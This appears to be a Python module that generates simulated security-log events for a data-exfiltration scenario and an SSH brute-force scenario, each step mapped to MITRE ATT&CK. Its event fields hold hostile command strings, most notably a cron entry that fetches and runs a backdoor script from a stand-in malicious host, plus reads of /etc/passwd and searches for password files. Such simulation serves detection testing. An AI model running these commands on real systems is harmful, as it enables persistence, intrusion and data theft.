"""
Basic Scenarios Module

This module provides basic attack scenario implementations for the simulation system.
"""

import random
from typing import Dict, Any, List

from .base_scenario import BaseScenario

class DataExfiltrationScenario(BaseScenario):
    """Data exfiltration attack scenario."""
    
    def __init__(self, config, entities):
        """Initialize the data exfiltration scenario."""
        super().__init__(config, entities)
        
        self.scenario_type = "data_exfiltration"
        self.scenario_name = "Data Exfiltration"
        self.scenario_description = "Simulates a data exfiltration attack"
        
        # Scenario-specific state
        self.stage_progress = {}
        self.exfiltrated_data_size = 0
        self.max_exfiltration_size = random.randint(50, 200) * 1024  # 50-200 MB
    
    def _select_target_entities(self) -> None:
        """Select target entities for the scenario."""
        # Select a random host as the target
        target_host = self._get_random_host()
        if target_host:
            self.target_entities["host"] = target_host
        
        # Select a random user as the target
        target_user = self._get_random_user()
        if target_user:
            self.target_entities["user"] = target_user
    
    def _initialize_stages(self) -> None:
        """Initialize scenario stages."""
        self.stages = [
            "initial_access",
            "discovery",
            "collection",
            "exfiltration"
        ]
        
        # Initialize stage progress
        for stage in self.stages:
            self.stage_progress[stage] = 0
    
    def _execute_current_stage(self) -> List[Dict[str, Any]]:
        """
        Execute the current scenario stage.
        
        Returns:
            List of generated events
        """
        if self.current_stage >= len(self.stages):
            return []
        
        current_stage = self.stages[self.current_stage]
        events = []
        
        # Execute stage-specific logic
        if current_stage == "initial_access":
            events = self._execute_initial_access_stage()
        elif current_stage == "discovery":
            events = self._execute_discovery_stage()
        elif current_stage == "collection":
            events = self._execute_collection_stage()
        elif current_stage == "exfiltration":
            events = self._execute_exfiltration_stage()
        
        return events
    
    def _is_current_stage_completed(self) -> bool:
        """
        Check if the current stage is completed.
        
        Returns:
            True if the current stage is completed, False otherwise
        """
        if self.current_stage >= len(self.stages):
            return True
        
        current_stage = self.stages[self.current_stage]
        
        # Check stage-specific completion criteria
        if current_stage == "initial_access":
            return self.stage_progress[current_stage] >= 100
        elif current_stage == "discovery":
            return self.stage_progress[current_stage] >= 100
        elif current_stage == "collection":
            return self.stage_progress[current_stage] >= 100
        elif current_stage == "exfiltration":
            return self.stage_progress[current_stage] >= 100
        
        return False
    
    def _execute_initial_access_stage(self) -> List[Dict[str, Any]]:
        """
        Execute the initial access stage.
        
        Returns:
            List of generated events
        """
        events = []
        
        # Skip if no target entities
        if "host" not in self.target_entities or "user" not in self.target_entities:
            self.stage_progress["initial_access"] = 100
            return events
        
        target_host = self.target_entities["host"]
        target_user = self.target_entities["user"]
        
        # Generate initial access event (e.g., phishing, exploitation)
        if self.stage_progress["initial_access"] < 50:
            # Phishing email event
            event = self._create_base_event(severity="Medium")
            event.update({
                "event_type": "email",
                "entity": target_user.get_id(),
                "entity_type": "user",
                "user_name": target_user.get_attribute("username"),
                "email_subject": "Important: Security Update Required",
                "email_from": "security@example.com",
                "email_to": target_user.get_attribute("email"),
                "has_attachment": True,
                "attachment_name": "security_update.docx",
                "suspicious": True,
                "reason": "phishing email with malicious attachment"
            })
            
            # Add MITRE ATT&CK mapping
            self._add_mitre_attack_mapping(event, ['T1566.001'])  # Phishing: Spearphishing Attachment
            
            events.append(event)
            self.stage_progress["initial_access"] = 50
        elif self.stage_progress["initial_access"] < 100:
            # Malicious document execution event
            event = self._create_base_event(severity="High")
            event.update({
                "event_type": "process",
                "entity": target_host.get_id(),
                "entity_type": "host",
                "host_name": target_host.get_attribute("hostname"),
                "user_name": target_user.get_attribute("username"),
                "process_name": "winword.exe",
                "process_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "process_id": random.randint(1000, 65535),
                "parent_process_name": "explorer.exe",
                "parent_process_path": "C:\\Windows\\explorer.exe",
                "parent_process_id": random.randint(1000, 65535),
                "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\user\\Downloads\\security_update.docx\"",
                "suspicious": True,
                "reason": "office document executing suspicious child process"
            })
            
            # Add MITRE ATT&CK mapping
            self._add_mitre_attack_mapping(event, ['T1204.002'])  # User Execution: Malicious File
            
            events.append(event)
            
            # Malicious macro execution event
            event = self._create_base_event(severity="High")
            event.update({
                "event_type": "process",
                "entity": target_host.get_id(),
                "entity_type": "host",
                "host_name": target_host.get_attribute("hostname"),
                "user_name": target_user.get_attribute("username"),
                "process_name": "cmd.exe",
                "process_path": "C:\\Windows\\System32\\cmd.exe",
                "process_id": random.randint(1000, 65535),
                "parent_process_name": "winword.exe",
                "parent_process_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "parent_process_id": random.randint(1000, 65535),
                "command_line": "cmd.exe /c powershell.exe -EncodedCommand <base64-encoded-command>",
                "suspicious": True,
                "reason": "office document spawning command shell"
            })
            
            # Add MITRE ATT&CK mapping
            self._add_mitre_attack_mapping(event, ['T1059.003'])  # Command and Scripting Interpreter: Windows Command Shell
            
            events.append(event)
            self.stage_progress["initial_access"] = 100
        
        return events
    
    def _execute_discovery_stage(self) -> List[Dict[str, Any]]:
        """
        Execute the discovery stage.
        
        Returns:
            List of generated events
        """
        events = []
        
        # Skip if no target entities
        if "host" not in self.target_entities or "user" not in self.target_entities:
            self.stage_progress["discovery"] = 100
            return events
        
        target_host = self.target_entities["host"]
        target_user = self.target_entities["user"]
        
        # Generate discovery events
        if self.stage_progress["discovery"] < 33:
            # System information discovery
            event = self._create_base_event(severity="Medium")
            event.update({
                "event_type": "process",
                "entity": target_host.get_id(),
                "entity_type": "host",
                "host_name": target_host.get_attribute("hostname"),
                "user_name": target_user.get_attribute("username"),
                "process_name": "cmd.exe",
                "process_path": "C:\\Windows\\System32\\cmd.exe",
                "process_id": random.randint(1000, 65535),
                "parent_process_name": "powershell.exe",
                "parent_process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "parent_process_id": random.randint(1000, 65535),
                "command_line": "cmd.exe /c systeminfo",
                "suspicious": True,
                "reason": "system information discovery"
            })
            
            # Add MITRE ATT&CK mapping
            self._add_mitre_attack_mapping(event, ['T1082'])  # System Information Discovery
            
            events.append(event)
            self.stage_progress["discovery"] = 33
        elif self.stage_progress["discovery"] < 66:
            # Network discovery
            event = self._create_base_event(severity="Medium")
            event.update({
                "event_type": "process",
                "entity": target_host.get_id(),
                "entity_type": "host",
                "host_name": target_host.get_attribute("hostname"),
                "user_name": target_user.get_attribute("username"),
                "process_name": "cmd.exe",
                "process_path": "C:\\Windows\\System32\\cmd.exe",
                "process_id": random.randint(1000, 65535),
                "parent_process_name": "powershell.exe",
                "parent_process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "parent_process_id": random.randint(1000, 65535),
                "command_line": "cmd.exe /c ipconfig /all & net view & arp -a",
                "suspicious": True,
                "reason": "network discovery"
            })
            
            # Add MITRE ATT&CK mapping
            self._add_mitre_attack_mapping(event, ['T1016'])  # System Network Configuration Discovery
            
            events.append(event)
            self.stage_progress["discovery"] = 66
        elif self.stage_progress["discovery"] < 100:
            # File and directory discovery
            event = self._create_base_event(severity="Medium")
            event.update({
                "event_type": "process",
                "entity": target_host.get_id(),
                "entity_type": "host",
                "host_name": target_host.get_attribute("hostname"),
                "user_name": target_user.get_attribute("username"),
                "process_name": "cmd.exe",
                "process_path": "C:\\Windows\\System32\\cmd.exe",
                "process_id": random.randint(1000, 65535),
                "parent_process_name": "powershell.exe",
                "parent_process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "parent_process_id": random.randint(1000, 65535),
                "command_line": "cmd.exe /c dir /s /b C:\\Users\\*password* C:\\Users\\*secret* C:\\Users\\*confidential*",
                "suspicious": True,
                "reason": "searching for sensitive files"
            })
            
            # Add MITRE ATT&CK mapping
            self._add_mitre_attack_mapping(event, ['T1083'])  # File and Directory Discovery
            
            events.append(event)
            self.stage_progress["discovery"] = 100
        
        return events
    
    def _execute_collection_stage(self) -> List[Dict[str, Any]]:
        """
        Execute the collection stage.
        
        Returns:
            List of generated events
        """
        events = []
        
        # Skip if no target entities
        if "host" not in self.target_entities or "user" not in self.target_entities:
            self.stage_progress["collection"] = 100
            return events
        
        target_host = self.target_entities["host"]
        target_user = self.target_entities["user"]
        
        # Generate collection events
        if self.stage_progress["collection"] < 50:
            # Data from local system
            event = self._create_base_event(severity="High")
            event.update({
                "event_type": "file",
                "entity": target_host.get_id(),
                "entity_type": "host",
                "host_name": target_host.get_attribute("hostname"),
                "user_name": target_user.get_attribute("username"),
                "file_path": "C:\\Users\\user\\Documents\\passwords.xlsx",
                "file_name": "passwords.xlsx",
                "file_extension": ".xlsx",
                "action": "accessed",
                "process_name": "excel.exe",
                "process_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
                "process_id": random.randint(1000, 65535),
                "suspicious": True,
                "reason": "sensitive file accessed by suspicious process"
            })
            
            # Add MITRE ATT&CK mapping
            self._add_mitre_attack_mapping(event, ['T1005'])  # Data from Local System
            
            events.append(event)
            self.stage_progress["collection"] = 50
        elif self.stage_progress["collection"] < 100:
            # Archive collected data
            event = self._create_base_event(severity="High")
            event.update({
                "event_type": "process",
                "entity": target_host.get_id(),
                "entity_type": "host",
                "host_name": target_host.get_attribute("hostname"),
                "user_name": target_user.get_attribute("username"),
                "process_name": "powershell.exe",
                "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "process_id": random.randint(1000, 65535),
                "parent_process_name": "cmd.exe",
                "parent_process_path": "C:\\Windows\\System32\\cmd.exe",
                "parent_process_id": random.randint(1000, 65535),
                "command_line": "powershell.exe -Command Compress-Archive -Path 'C:\\Users\\user\\Documents\\*' -DestinationPath 'C:\\Users\\user\\Documents\\archive.zip'",
                "suspicious": True,
                "reason": "archiving sensitive files"
            })
            
            # Add MITRE ATT&CK mapping
            self._add_mitre_attack_mapping(event, ['T1560.001'])  # Archive Collected Data: Archive via Utility
            
            events.append(event)
            self.stage_progress["collection"] = 100
        
        return events
    
    def _execute_exfiltration_stage(self) -> List[Dict[str, Any]]:
        """
        Execute the exfiltration stage.
        
        Returns:
            List of generated events
        """
        events = []
        
        # Skip if no target entities
        if "host" not in self.target_entities or "user" not in self.target_entities:
            self.stage_progress["exfiltration"] = 100
            return events
        
        target_host = self.target_entities["host"]
        target_user = self.target_entities["user"]
        
        # Generate exfiltration events
        if self.stage_progress["exfiltration"] < 100:
            # Calculate progress based on exfiltrated data size
            progress = min(100, int((self.exfiltrated_data_size / self.max_exfiltration_size) * 100))
            
            # Exfiltration over C2 channel
            event = self._create_base_event(severity="Critical")
            event.update({
                "event_type": "network_connection",
                "entity": target_host.get_id(),
                "entity_type": "host",
                "host_name": target_host.get_attribute("hostname"),
                "user_name": target_user.get_attribute("username"),
                "source_ip": target_host.get_attribute("ip_address"),
                "destination_ip": "185.128.25." + str(random.randint(2, 254)),
                "destination_port": random.choice([443, 8443, 8080]),
                "protocol": "TCP",
                "bytes_sent": random.randint(10000, 50000),
                "bytes_received": random.randint(1000, 5000),
                "connection_duration": random.randint(10, 60),
                "suspicious": True,
                "reason": "large data transfer to suspicious external IP"
            })
            
            # Add MITRE ATT&CK mapping
            self._add_mitre_attack_mapping(event, ['T1041'])  # Exfiltration Over C2 Channel
            
            events.append(event)
            
            # Update exfiltrated data size
            self.exfiltrated_data_size += event["bytes_sent"]
            
            # Update stage progress
            self.stage_progress["exfiltration"] = progress
        
        return events


class BruteForceScenario(BaseScenario):
    """Brute force attack scenario."""
    
    def __init__(self, config, entities):
        """Initialize the brute force scenario."""
        super().__init__(config, entities)
        
        self.scenario_type = "brute_force"
        self.scenario_name = "Brute Force Attack"
        self.scenario_description = "Simulates a brute force attack against user accounts"
        
        # Scenario-specific state
        self.stage_progress = {}
        self.login_attempts = 0
        self.max_login_attempts = random.randint(10, 30)
        self.successful_login = False
    
    def _select_target_entities(self) -> None:
        """Select target entities for the scenario."""
        # Select a random host as the target
        target_host = self._get_random_host()
        if target_host:
            self.target_entities["host"] = target_host
        
        # Select a random user as the target
        target_user = self._get_random_user()
        if target_user:
            self.target_entities["user"] = target_user
    
    def _initialize_stages(self) -> None:
        """Initialize scenario stages."""
        self.stages = [
            "reconnaissance",
            "brute_force",
            "initial_access",
            "lateral_movement"
        ]
        
        # Initialize stage progress
        for stage in self.stages:
            self.stage_progress[stage] = 0
    
    def _execute_current_stage(self) -> List[Dict[str, Any]]:
        """
        Execute the current scenario stage.
        
        Returns:
            List of generated events
        """
        if self.current_stage >= len(self.stages):
            return []
        
        current_stage = self.stages[self.current_stage]
        events = []
        
        # Execute stage-specific logic
        if current_stage == "reconnaissance":
            events = self._execute_reconnaissance_stage()
        elif current_stage == "brute_force":
            events = self._execute_brute_force_stage()
        elif current_stage == "initial_access":
            events = self._execute_initial_access_stage()
        elif current_stage == "lateral_movement":
            events = self._execute_lateral_movement_stage()
        
        return events
    
    def _is_current_stage_completed(self) -> bool:
        """
        Check if the current stage is completed.
        
        Returns:
            True if the current stage is completed, False otherwise
        """
        if self.current_stage >= len(self.stages):
            return True
        
        current_stage = self.stages[self.current_stage]
        
        # Check stage-specific completion criteria
        if current_stage == "reconnaissance":
            return self.stage_progress[current_stage] >= 100
        elif current_stage == "brute_force":
            return self.stage_progress[current_stage] >= 100
        elif current_stage == "initial_access":
            # Skip initial access if brute force was unsuccessful
            if not self.successful_login:
                return True
            return self.stage_progress[current_stage] >= 100
        elif current_stage == "lateral_movement":
            # Skip lateral movement if brute force was unsuccessful
            if not self.successful_login:
                return True
            return self.stage_progress[current_stage] >= 100
        
        return False
    
    def _execute_reconnaissance_stage(self) -> List[Dict[str, Any]]:
        """
        Execute the reconnaissance stage.
        
        Returns:
            List of generated events
        """
        events = []
        
        # Skip if no target entities
        if "host" not in self.target_entities or "user" not in self.target_entities:
            self.stage_progress["reconnaissance"] = 100
            return events
        
        target_host = self.target_entities["host"]
        
        # Generate reconnaissance events
        if self.stage_progress["reconnaissance"] < 50:
            # Network scan event
            event = self._create_base_event(severity="Low")
            event.update({
                "event_type": "network_connection",
                "entity": target_host.get_id(),
                "entity_type": "host",
                "host_name": target_host.get_attribute("hostname"),
                "source_ip": "192.168.1." + str(random.randint(2, 254)),
                "destination_ip": target_host.get_attribute("ip_address"),
                "destination_port": 22,  # SSH
                "protocol": "TCP",
                "bytes_sent": random.randint(100, 500),
                "bytes_received": random.randint(100, 500),
                "connection_duration": random.randint(1, 5),
                "suspicious": True,
                "reason": "port scan detected"
            })
            
            # Add MITRE ATT&CK mapping
            self._add_mitre_attack_mapping(event, ['T1046'])  # Network Service Scanning
            
            events.append(event)
            self.stage_progress["reconnaissance"] = 50
        elif self.stage_progress["reconnaissance"] < 100:
            # User enumeration event
            event = self._create_base_event(severity="Medium")
            event.update({
                "event_type": "authentication",
                "entity": target_host.get_id(),
                "entity_type": "host",
                "host_name": target_host.get_attribute("hostname"),
                "user_name": "admin",  # Common username for enumeration
                "authentication_type": "SSH",
                "authentication_status": "failure",
                "failure_reason": "invalid_credentials",
                "source_ip": "192.168.1." + str(random.randint(2, 254)),
                "suspicious": True,
                "reason": "user enumeration attempt"
            })
            
            # Add MITRE ATT&CK mapping
            self._add_mitre_attack_mapping(event, ['T1087'])  # Account Discovery
            
            events.append(event)
            self.stage_progress["reconnaissance"] = 100
        
        return events
    
    def _execute_brute_force_stage(self) -> List[Dict[str, Any]]:
        """
        Execute the brute force stage.
        
        Returns:
            List of generated events
        """
        events = []
        
        # Skip if no target entities
        if "host" not in self.target_entities or "user" not in self.target_entities:
            self.stage_progress["brute_force"] = 100
            return events
        
        target_host = self.target_entities["host"]
        target_user = self.target_entities["user"]
        
        # Generate brute force events
        if self.stage_progress["brute_force"] < 100:
            # Calculate progress based on login attempts
            progress = min(100, int((self.login_attempts / self.max_login_attempts) * 100))
            
            # Determine if this attempt will be successful
            is_successful = False
            if self.login_attempts == self.max_login_attempts - 1:  # Last attempt
                is_successful = random.random() < 0.7  # 70% chance of success on last attempt
                self.successful_login = is_successful
            
            # Authentication event
            event = self._create_base_event(severity="High")
            event.update({
                "event_type": "authentication",
                "entity": target_host.get_id(),
                "entity_type": "host",
                "host_name": target_host.get_attribute("hostname"),
                "user_name": target_user.get_attribute("username"),
                "authentication_type": "SSH",
                "authentication_status": "success" if is_successful else "failure",
                "source_ip": "192.168.1." + str(random.randint(2, 254)),
                "suspicious": True,
                "reason": "brute force attack" + (" - successful" if is_successful else "")
            })
            
            # Add failure reason if authentication failed
            if not is_successful:
                event["failure_reason"] = "invalid_credentials"
            
            # Add MITRE ATT&CK mapping
            self._add_mitre_attack_mapping(event, ['T1110.001'])  # Brute Force: Password Guessing
            
            events.append(event)
            
            # Update login attempts
            self.login_attempts += 1
            
            # Update stage progress
            self.stage_progress["brute_force"] = progress
        
        return events
    
    def _execute_initial_access_stage(self) -> List[Dict[str, Any]]:
        """
        Execute the initial access stage.
        
        Returns:
            List of generated events
        """
        events = []
        
        # Skip if no target entities or brute force was unsuccessful
        if "host" not in self.target_entities or "user" not in self.target_entities or not self.successful_login:
            self.stage_progress["initial_access"] = 100
            return events
        
        target_host = self.target_entities["host"]
        target_user = self.target_entities["user"]
        
        # Generate initial access events
        if self.stage_progress["initial_access"] < 50:
            # Shell command execution
            event = self._create_base_event(severity="High")
            event.update({
                "event_type": "process",
                "entity": target_host.get_id(),
                "entity_type": "host",
                "host_name": target_host.get_attribute("hostname"),
                "user_name": target_user.get_attribute("username"),
                "process_name": "bash",
                "process_path": "/bin/bash",
                "process_id": random.randint(1000, 65535),
                "parent_process_name": "sshd",
                "parent_process_path": "/usr/sbin/sshd",
                "parent_process_id": random.randint(1000, 65535),
                "command_line": "bash -c 'id; uname -a; cat /etc/passwd'",
                "suspicious": True,
                "reason": "suspicious command execution after successful brute force"
            })
            
            # Add MITRE ATT&CK mapping
            self._add_mitre_attack_mapping(event, ['T1059.004'])  # Command and Scripting Interpreter: Unix Shell
            
            events.append(event)
            self.stage_progress["initial_access"] = 50
        elif self.stage_progress["initial_access"] < 100:
            # Persistence establishment
            event = self._create_base_event(severity="Critical")
            event.update({
                "event_type": "process",
                "entity": target_host.get_id(),
                "entity_type": "host",
                "host_name": target_host.get_attribute("hostname"),
                "user_name": target_user.get_attribute("username"),
                "process_name": "bash",
                "process_path": "/bin/bash",
                "process_id": random.randint(1000, 65535),
                "parent_process_name": "sshd",
                "parent_process_path": "/usr/sbin/sshd",
                "parent_process_id": random.randint(1000, 65535),
                "command_line": "bash -c 'echo \"*/5 * * * * curl -s http://malicious.example.com/backdoor.sh | bash\" > /tmp/.cron; crontab /tmp/.cron'",
                "suspicious": True,
                "reason": "establishing persistence via crontab"
            })
            
            # Add MITRE ATT&CK mapping
            self._add_mitre_attack_mapping(event, ['T1053.003'])  # Scheduled Task/Job: Cron
            
            events.append(event)
            self.stage_progress["initial_access"] = 100
        
        return events
    
    def _execute_lateral_movement_stage(self) -> List[Dict[str, Any]]:
        """
        Execute the lateral movement stage.
        
        Returns:
            List of generated events
        """
        events = []
        
        # Skip if no target entities or brute force was unsuccessful
        if "host" not in self.target_entities or "user" not in self.target_entities or not self.successful_login:
            self.stage_progress["lateral_movement"] = 100
            return events
        
        target_host = self.target_entities["host"]
        target_user = self.target_entities["user"]
        
        # Generate lateral movement events
        if self.stage_progress["lateral_movement"] < 50:
            # Internal network scanning
            event = self._create_base_event(severity="High")
            event.update({
                "event_type": "process",
                "entity": target_host.get_id(),
                "entity_type": "host",
                "host_name": target_host.get_attribute("hostname"),
                "user_name": target_user.get_attribute("username"),
                "process_name": "nmap",
                "process_path": "/usr/bin/nmap",
                "process_id": random.randint(1000, 65535),
                "parent_process_name": "bash",
                "parent_process_path": "/bin/bash",
                "parent_process_id": random.randint(1000, 65535),
                "command_line": "nmap -sS -p 22,3389,445 192.168.1.0/24",
                "suspicious": True,
                "reason": "internal network scanning"
            })
            
            # Add MITRE ATT&CK mapping
            self._add_mitre_attack_mapping(event, ['T1046'])  # Network Service Scanning
            
            events.append(event)
            self.stage_progress["lateral_movement"] = 50
        elif self.stage_progress["lateral_movement"] < 100:
            # SSH to another host
            event = self._create_base_event(severity="Critical")
            event.update({
                "event_type": "process",
                "entity": target_host.get_id(),
                "entity_type": "host",
                "host_name": target_host.get_attribute("hostname"),
                "user_name": target_user.get_attribute("username"),
                "process_name": "ssh",
                "process_path": "/usr/bin/ssh",
                "process_id": random.randint(1000, 65535),
                "parent_process_name": "bash",
                "parent_process_path": "/bin/bash",
                "parent_process_id": random.randint(1000, 65535),
                "command_line": f"ssh user@192.168.1.{random.randint(2, 254)} -i /tmp/.ssh/id_rsa",
                "suspicious": True,
                "reason": "lateral movement to another host"
            })
            
            # Add MITRE ATT&CK mapping
            self._add_mitre_attack_mapping(event, ['T1021.004'])  # Remote Services: SSH
            
            events.append(event)
            self.stage_progress["lateral_movement"] = 100
        
        return events
